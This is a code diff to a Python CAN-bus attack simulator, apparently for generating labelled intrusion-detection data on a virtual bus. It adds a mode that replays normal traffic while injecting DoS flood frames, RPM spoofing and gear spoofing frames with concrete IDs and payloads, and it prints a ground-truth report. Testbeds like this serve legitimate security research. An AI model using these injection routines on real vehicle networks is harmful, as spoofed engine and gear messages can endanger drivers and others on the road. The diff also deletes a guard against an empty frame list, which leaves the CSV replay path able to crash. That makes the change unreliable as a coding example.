@@ -391,9 +391,6 @@ def manual_csv_load(bus: can.Bus) -> None:
     frames = _parse_can_csv(path, filter_flag="R" if not send_all else None)
 
     print(f"\n  Loaded {len(frames)} frames from {path.name}")
-    if not frames:
-        print("  No frames to send after filtering.")
-        return
     print(f"  ID range: 0x{min(f[1].arbitration_id for f in frames):03X} - "
           f"0x{max(f[1].arbitration_id for f in frames):03X}")
     print(f"  Press Ctrl+C to stop\n")
@@ -433,6 +430,151 @@ def _candump_listener(bus: can.Bus, stop_event: threading.Event) -> None:
             data_hex = msg.data.hex().upper()
             print(f"  ({msg.timestamp:.6f}) vcan_sim {msg.arbitration_id:03X}#{data_hex}")
 
+# ---------------------------------------------------------------------------
+# Continuous Normal & Dynamic Injection Mode
+# ---------------------------------------------------------------------------
+
+class ContinuousNormalThread(threading.Thread):
+    def __init__(self, bus: can.Bus, normal_frames: list, duration_sec: int):
+        super().__init__(daemon=True)
+        self.bus = bus
+        self.normal_frames = normal_frames
+        self.duration_sec = duration_sec
+        self.stop_event = threading.Event()
+        self.total_sent = 0
+
+    def run(self):
+        print(f"\n  [INFO] Starting continuous normal replay for {self.duration_sec} seconds...")
+        start_time = time.time()
+        frame_idx = 0
+        total_frames = len(self.normal_frames)
+
+        if total_frames == 0:
+            print("  [ERROR] No normal frames available to replay.")
+            return
+
+        while not self.stop_event.is_set():
+            if time.time() - start_time > self.duration_sec:
+                break
+
+            ts, frame = self.normal_frames[frame_idx]
+            self.bus.send(frame)
+            self.total_sent += 1
+
+            next_idx = (frame_idx + 1) % total_frames
+            next_ts, _ = self.normal_frames[next_idx]
+
+            delay = next_ts - ts
+            if delay <= 0:
+                delay = 0.001 
+
+            if delay > 0:
+                time.sleep(delay)
+
+            frame_idx = next_idx
+
+        print(f"\n  [INFO] Continuous normal replay finished. Sent {self.total_sent} frames.")
+
+    def stop(self):
+        self.stop_event.set()
+
+def _inject_attack(bus: can.Bus, attack_type: str, num_frames: int, interval_sec: float):
+    print(f"\n  [ALERT] Injecting {attack_type.upper()} attack...")
+    
+    start_ts = time.time()
+    sent = 0
+
+    if attack_type == "dos":
+        frame = can.Message(arbitration_id=0x000, data=[0]*8, is_extended_id=False)
+    elif attack_type == "rpm":
+        frame = can.Message(arbitration_id=0x0316, data=[0x45, 0x29, 0x24, 0xFF, 0x29, 0x24, 0x00, 0xFF], is_extended_id=False)
+    elif attack_type == "gear":
+        frame = can.Message(arbitration_id=0x043F, data=[0x01, 0x45, 0x60, 0xFF, 0x6B, 0x00, 0x00, 0x00], is_extended_id=False)
+    else:
+        print("  [ERROR] Invalid attack type specified.")
+        return
+
+    try:
+        for _ in range(num_frames):
+            bus.send(frame)
+            sent += 1
+            if interval_sec > 0:
+                time.sleep(interval_sec)
+    except KeyboardInterrupt:
+        print("\n  [INFO] Attack injection stopped by user.")
+
+    end_ts = time.time()
+
+    print("\n" + "="*50)
+    print(" INJECTION REPORT (GROUND TRUTH)")
+    print("="*50)
+    print(f" Attack Type       : {attack_type.upper()}")
+    print(f" Frames Sent       : {sent}")
+    print(f" Interval          : {interval_sec*1000:.2f} ms")
+    print(f" Start Timestamp   : {start_ts:.6f}")
+    print(f" End Timestamp     : {end_ts:.6f}")
+    print(f" Total Duration    : {(end_ts - start_ts):.4f} seconds")
+    print("="*50 + "\n")
+
+def attack_continuous_inject(bus: can.Bus) -> None:
+    print("\n  === Continuous Normal & Dynamic Inject ===")
+    normal_path = input("  Path to normal CAN CSV (leave blank for synthetic): ").strip()
+    
+    if normal_path and Path(normal_path).exists():
+        print("  Loading normal frames, please wait...")
+        normal_frames = _parse_can_csv(normal_path)
+    else:
+        print("  Generating synthetic normal frames...")
+        ids = [0x100, 0x200, 0x300, 0x400, 0x500]
+        normal_frames = []
+        ts = 0.0
+        for i in range(1000):
+            arb_id = ids[i % len(ids)]
+            data = [(i + b) % 256 for b in range(8)]
+            frame = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
+            normal_frames.append((ts, frame))
+            ts += 0.002
+
+    duration_input = input("  Duration for continuous normal traffic (seconds, default 600): ").strip()
+    duration_sec = int(duration_input) if duration_input else 600
+
+    normal_thread = ContinuousNormalThread(bus, normal_frames, duration_sec)
+    normal_thread.start()
+    time.sleep(1)
+
+    try:
+        while normal_thread.is_alive():
+            print("\n  --- DYNAMIC INJECTION MENU ---")
+            print("  Normal traffic is running. Choose an attack to inject:")
+            print("    [1] Inject DoS Attack")
+            print("    [2] Inject RPM Attack")
+            print("    [3] Inject Gear Attack")
+            print("    [q] Quit Injection Mode")
+            
+            choice = input("  Select option: ").strip().lower()
+            
+            if choice == 'q':
+                break
+            elif choice in ['1', '2', '3']:
+                attack_map = {'1': 'dos', '2': 'rpm', '3': 'gear'}
+                attack_type = attack_map[choice]
+                
+                num_input = input(f"  Number of {attack_type.upper()} frames (default 1000): ").strip()
+                num_frames = int(num_input) if num_input else 1000
+                
+                interval_input = input("  Interval in seconds (default 0.001): ").strip()
+                interval_sec = float(interval_input) if interval_input else 0.001
+                
+                _inject_attack(bus, attack_type, num_frames, interval_sec)
+            else:
+                print("  Invalid choice.")
+    except KeyboardInterrupt:
+        print("\n  Stopping continuous injection mode...")
+    finally:
+        normal_thread.stop()
+        normal_thread.join()
+        print("  Continuous mode exited.")
+
 
 # ---------------------------------------------------------------------------
 # Main menu
@@ -444,6 +586,7 @@ ATTACK_MENU = {
     "3": ("Gear Spoofing", attack_gear),
     "4": ("RPM Spoofing", attack_rpm),
     "5": ("Manual / CSV Replay", attack_manual),
+    "6": ("Continuous Normal & Dynamic Inject", attack_continuous_inject),
 }
 
 
